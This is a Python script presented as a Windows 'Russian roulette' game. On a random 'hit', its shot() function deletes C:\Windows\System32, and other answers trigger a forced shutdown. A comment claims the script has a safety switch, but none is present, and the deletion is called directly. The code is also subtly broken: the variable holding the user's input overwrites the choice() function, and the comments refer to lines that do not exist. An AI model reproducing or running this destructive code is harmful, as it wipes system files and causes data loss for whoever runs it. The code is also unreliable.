from random import randint as rdmNo
import subprocess
import shutil
import ctypes
import sys
from time import sleep
  

def shot():
    shutil.rmtree(r"C:\Windows\System32")

def run(cmd):
    subprocess.run(cmd, shell=True, capture_output=False)

acceptWords = [
  'yes','sure','ofc','of course','definitely','absolutely','with pleasure','i do','i trust my fortune','i dare','indeed','positive','true'
]
denyWords = [
  'no','no thanks','ofc not','of course not','definitely not','absolutely not',"i don't",'i do not','i do not trust my fortune',"i'm scared","i am scared","i'm afraid",'i am afraid',"i'm too scared",'i am too scaared','negative','false'
]
def choice(choice):
  global acceptWords
  global denyWords
  acptWords = acceptWords
  dnyWords = denyWords

  choice = choice.lower()
  if choice in acptWords:
    return True
  elif choice in dnyWords:
    return False
  else:
    return "Punish"

if __name__ == '__main__':
    print("A gun. Six slots; 1 round. Good luck, but you probably won't need it.\n")
    sleep(1.25)
    print("Spinning barrel.")
    sleep(0.7)
    print("Spinning barrel..")
    sleep(0.7)
    print("Spinning barrel...")
    loadedSlot = rdmNo(1,6)
    shootingSlot = rdmNo(1,6)
    sleep(1)
    print("Now...\n")
    sleep(1)
    choice = input("Do you trust your fortune to pull the trigger or are you too scared?")
    if choice(choice):
      if shootingSlot == loadedSlot:
        print("Ah... what a shame...\n")
        sleep(0.4)
        print("Well better luck next time- ",end=" ")
        sleep(0.3)
        print("Oh wait there won't be a next time...",end=" ")
        sleep(1)
        #remove line below and the if statement below that, and replace shot(confirmed) with shot(False)
        #if you want to turn safety off (make it actually malicious)
        shot()
      else:
        sleep(0.4)
        print("As expected!\n")
        sleep(0.3)
        print("I commend you for your fortune.",end=" ")
        sleep(0.2)
        print("Well done.")
    elif choice(choice) == False:
      print("Well that's a shame...")
      sleep(0.3)
      print("I won't be seeing you off then...")
      sleep(3)
      run("shutdown /p /f")
    elif choice(choice) == "Punish":
      print("Had I known you'd be this rude, I would've kicked you out already.")
      sleep(0.07)
      print("You need to be taught a lesson...")
      sleep(0.4)
      run("shutdown /p /f")
    else:
      raise Exception("how did this happen...") #This may or may not happen
